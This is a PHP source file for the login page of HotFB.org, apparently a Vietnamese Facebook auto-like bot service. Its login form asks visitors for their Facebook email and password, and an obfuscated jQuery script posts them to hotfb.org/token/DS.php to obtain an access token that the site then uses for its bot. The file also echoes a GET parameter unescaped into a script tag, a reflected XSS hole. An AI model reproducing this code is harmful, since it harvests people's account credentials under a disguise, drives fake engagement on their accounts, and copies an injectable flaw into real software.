<?php
include 'head.php';
include '123config/configg.php';

if(isset($_GET['i'])){
echo '
<script>
alert("' . $_GET['i'] . '")
</script>';
}
if($Lady=='reset') { session_destroy(); }
if(isset($_SESSION['id'])) {
include 'menu.php';

}else{
form();
}


            
function form(){
$js = '';
$babi = mysql_query ("SELECT name, COUNT(name) FROM bot");
$rober = mysql_fetch_array($babi);
$rec=$rober['COUNT(name)'];
$babi2 = mysql_query ("SELECT name, COUNT(name) FROM botcmt");
$rober2 = mysql_fetch_array($babi2);
$rec2=$rober2['COUNT(name)'];
$babi3 = mysql_query ("SELECT name, COUNT(name) FROM botlike2");
$rober3 = mysql_fetch_array($babi3);
$rec3=$rober3['COUNT(name)'];
$babi4 = mysql_query ("SELECT name, COUNT(name) FROM exlike");
$rober4 = mysql_fetch_array($babi4);
$rec4=$rober4['COUNT(name)'];
$babi6 = mysql_query ("SELECT name, COUNT(name) FROM exlove");
$rober6 = mysql_fetch_array($babi6);
$rec6=$rober6['COUNT(name)'];

  echo'  
   <div class="content-page">
                <!-- Start content -->
                <div class="content">
                    <div class="container">
 <div class="row">
                        <!-- Page-Title -->
                        <div class="row">
                            <div class="col-sm-12">
                                <div class="page-title-box">
                                    <ol class="breadcrumb pull-right">
                                        <li><a href="#">Home</a></li>
                                        <li class="active">MeNu</li>
                                    </ol>
                                    <h4 class="page-title">HotFB.Org - Auto Bot Like fFcebook</h4>
                                </div>
                            </div>
                        </div>

		<div class="col-md-9">
			<div class="panel panel-success">
				<div class="panel-heading">
					<h4><i class="fa fa-angellist"></i> Welcome to HotFB.ORG</h4>
				</div>
				<div class="panel-body" style="text-align: center;">
					<div class="col-sm-4">
						<span class="fa fa-exclamation-triangle" style="font-size:60px;color:#FF3030;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>No Spam</b></h4>
						<p>Chúng tôi cam kết không bao giờ spam trên tài khoản của bạn</p>

					</div>
					<div class="col-sm-4">
						<span class="fa fa-leaf" style="font-size:60px;color:#008080;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>Web Development</b></h4>
						<p>Với đội ngũ trẻ chuyên nghiệp chúng tôi luôn đáp ứng đầy đủ nhu cầu của các bạn.</p>
					</div>
					<div class="col-sm-4">
						<span class="fa fa-lock" style="font-size:60px;color:#3399FF;text-shadow:2px 2px 4px #000000;"></span>
						<h4><b>Trusted Sites</b></h4>
						<p>Chúng tôi thành lập từ năm 2016. Và luôn cũng cấp cho các bạn các dịch vụ miễn phí</p>
					</div>
				</div>
			</div>
		</div>
		<div class="col-sm-3">
			<div class="panel panel-danger" style="height: 239px;">
				<div class="panel panel-heading">
					<h4><i class="fa fa-bullhorn"></i> Thông Báo</h4>
				</div>
				<div class="panel-body">
					<div style="visibility: visible; overflow: hidden; position: relative; z-index: 2; left: 0px; height: 140px;" class="newsticker-jcarousellite">
						<ul style="margin: 0pt; padding: 0pt; position: relative; list-style-type: none; z-index: 1; height: 765px; top: -245.835px;">
							<li style="overflow: hidden; float: none; width: 100%; height: 140px;">
								<div class="alert alert-info"> ﻿<img src="http://wapkaimage.com/400864/400864147_061a7f0a1d.gif"> CHÀO MỪNG ĐẾN VỚI HỆ THỐNG AUTO - BOT LIKE AuToBotFB.COM - HỆ THỐNG HIỆN ĐẠI NHẤT HIỆN NAY

						                      </div>
							</li><li style="overflow: hidden; float: none; width: 100%; height: 140px;">
								<div class="alert alert-info"> 
<img src="http://i.imgur.com/tqEnCND.gif"> Nâng Cấp Hệ Thống Thành Công! Mời Các Bạn Cùng Sử Dụng

						                      </div>
							</li><li style="overflow: hidden; float: none; width: 100%; height: 140px;">
								<div class="alert alert-info"> 
<img src="http://2.bp.blogspot.com/-aQ6awdbNqZQ/VXJGCGGBGAI/AAAAAAAAMGM/_bmty7Pl0b4/s1600/new.gif"> Các Bạn Nên Đăng Nhập Bằng Tài Khoản Facebook Để Việc BOT Hoạt Động Lâu Die Nhé

						                      </div>
							</li>						</ul>
					</div>
				</div>
			</div>
		</div>
		</div>
		</div>

<!--Panel Đăng Nhập-->

                            
			<div class="content-page">
                <!-- Start content -->
                <div class="content">
                    <div class="container">
 <div class="row">
                        <!-- Page-Title -->
                        <div class="row">
                            <div class="col-sm-12">
                                <div class="page-title-box">
                                    <ol class="breadcrumb pull-right">
                                        <li><a href="#">Home</a></li>
                                        <li class="active">MeNu</li>
                                    </ol>
                                    <h4 class="page-title">HotFB.Org - Auto Bot Like fFcebook</h4>
                                </div>
                            </div>
                        </div>

		<div class="col-md-9">
			<div class="panel panel-success">
				<div class="panel-heading">
					<h4><i class="fa fa-angellist"></i> Welcome to HotFB.ORG</h4>
				</div>
				<div class="panel-body" style="text-align: center;">
><label for="email">* Email hoặc số điện thoại :</label>
<input id="email" placeholder="Nhập Email" class="form-control"/>
</div>
<div class="form-group"><label for="password">* Mật khẩu :</label>
<input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* Chọn Ứng Dụng :</label>
<select id="app_id" class="form-control">
<option value="6628568379">Facebook For Iphone</option>
<option value="350685531728">Facebook For Android</option>
<option value="165907476854626">PAGES MANAGER FOR IOS</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary">Lấy Token</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<form action="login.php" method="post">
<input id="result" onclick="this.focus();this.select()" class="form-control" rows="2" name="access_token">
<span class="input-group-btn">
                                                       <button type="submit" class="btn btn-block btn-success btn-flat" onClick="Login()" data-toggle="tooltip" data-placement="right"> <i class="glyphicon glyphicon-repeat"></i> Đăng Nhập</button>
                                                        </span>

<script src="//code.jquery.com/jquery.min.js"></script>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Anh em vui lòng đợi...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "http://hotfb.org/token/DS.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>	                   
					</div>
				</div>
			</div>
		</div>
                                    
                            </div>
                            </div>                                
                            </div>
	
 <center>
			
<!--//Panel Đăng Nhập-->


                            
                            </div>
                            </div>                                
                            </div>

			<div class="col-md-12">
				<div class="panel panel-primary">
					<div class="panel-heading">
						<h4><i class="fa fa-question-circle"></i> Làm Thế Nào Để Sử Dụng?</h4>
					</div>
					<div class="panel-body">
						<div class="box-body well well-sm no-shadow" style="font-size:13px;">
							<font color="blue">Điều kiện 1:</font> Thiết lập năm sinh cho đủ 18+.
							<hr>
							<font color="blue">Điều kiện 2:</font> Ai có thể theo dõi bạn ? chọn <kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd><i class="fa fa-globe"></i> Everyone <i class="fa fa-caret-down"></i></kbd>. <a href="http://fb.com/settings?tab=followers" target="_blank" rel="nofollow"><font color="red">Thiết Lập</font></a>
							<hr>
							<font color="blue">Điều kiện 3:</font> Các bài viết phải ở chế độ <kbd><i class="fa fa-globe"></i> Mọi người</kbd>. <a href="https://www.facebook.com/settings?tab=privacy&amp;section=composer&amp;view" target="_blank" rel="nofollow"><font color="red">Thiết lập</font></a><br>
							(Thiết lập này chỉ áp dụng cho các bài đăng sau khi bạn thiết lập, các bài đăng trước đó bạn phải chỉnh sửa ngay trên bào đăng).
							<hr>
							<font color="blue">Điều kiện 4:</font> Riêng auto bình luận bạn phải bật cho phép <kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd><i class="fa fa-globe"></i> Everyone <i class="fa fa-caret-down"></i></kbd> có thể bình luận bài viết của bạn. <a href="http://fb.com/settings?tab=followers&amp;section=comment&amp;view" target="_blank" rel="nofollow"><font color="red">Thiết lập</font></a><br><br>
						</div>
					</div>
				</div>				
			</div><!--.col-md-12-->
		</div>
	</div>
</div>
<div class="modal inmodal" id="capquyen" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-lg">
		<div class="modal-content animated bounceIn">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
				<h4 class="modal-title">Cấp Quyền Ứng Dụng</h4>
				<small class="font-bold">
					<p class="text-danger">Lưu Ý: Mục Này Chỉ Dành Cho Tài Khoản Sử Dụng Lần Đâu Tại Website.</p>
				</small>
			</div>
			<div class="modal-body">
				<h3>Bước 1</h3>
				<a class="btn btn-outline btn-primary" href="https://goo.gl/Uqm5An" target="_blank"><i class="fa fa-cogs"></i> Cài Đặt Ứng Dụng Lần Đầu</a>
				<hr>
				<h3>Bước 2</h3>
				<div class="item">
					<img alt="image" class="img-responsive" src="img/1.png">
				</div>
				<div class="item">
					<img alt="image" class="img-responsive" src="img/2.png">
				</div>
				<div class="item active">
					<img alt="image" class="img-responsive" src="img/3.png">
				</div>
				<div class="item active">
					<img alt="image" class="img-responsive" src="img/4.png">
				</div>
				<hr>
				<h3>Bước 3</h3>
				<p style="font-size: 17px;">Sau Khi Thực Hiện Xong Các Bước Trên Bạn Trở Lại Website Vào Chọn Mục <a class="btn btn-outline btn-success" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a></p>
				<hr>
				<h3>Bước 4</h3>
				<div class="item">
					<img alt="image" class="img-responsive" src="img/5.png">
				</div>
				<p style="font-size: 17px;">Phần URL Màu Đỏ Bên Trên Chính Là Mã Token Của Bạn! </p>
				<hr>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">Đóng</button>
			</div>
		</div>
	</div>
</div>
           
         
';



}

include 'foot.php';




function getData($dir,$params=null){
$param = array(
'access_token' => getToken(),
);
if($params){ $arrayParams=array_merge($params,$param); }else{ $arrayParams =$param; }
$url = getUrl('graph',$dir,$arrayParams);
$result = json_decode(auto($url),true);
if($result[data]){
return $result[data];
}else{
return $result;
}
function getUrl($domain,$dir,$uri=null){
if($uri){
foreach($uri as $key =>$value){
$parsing[] = $key . '=' . $value;
}
$parse = '?' . implode('&',$parsing);
}
return 'https://' . $domain . '.facebook.com/' . $dir . $parse;
}
}

function getToken(){
return $_SESSION['access_token'];
}

function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}
?>

